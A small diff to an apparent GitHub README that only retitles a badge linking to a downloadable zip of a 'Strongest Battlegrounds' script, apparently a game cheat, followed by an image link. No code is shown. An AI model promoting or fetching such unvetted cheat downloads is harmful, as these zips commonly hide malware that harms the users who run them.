@@ -1,4 +1,4 @@
-[![Download The-Strongest-Battlegrounds Script](https://img.shields.io/badge/Download-The-Strongest-Battlegrounds%20Script-blueviolet)](https://github.com/Lua-Scripted/The-Strongest-Battlegrounds/releases/download/latest/The.Strongest.Battlegrounds.Script.zip)
+[![Download The-Strongest-Battlegrounds Script](https://img.shields.io/badge/Download-TheStrongestBattlegrounds%20Script-blueviolet)](https://github.com/Lua-Scripted/The-Strongest-Battlegrounds/releases/download/latest/The.Strongest.Battlegrounds.Script.zip)
 
 ![maxresdefault](https://github.com/user-attachments/assets/737ed7a0-abb2-4988-803b-8f1c9513bdce)
 
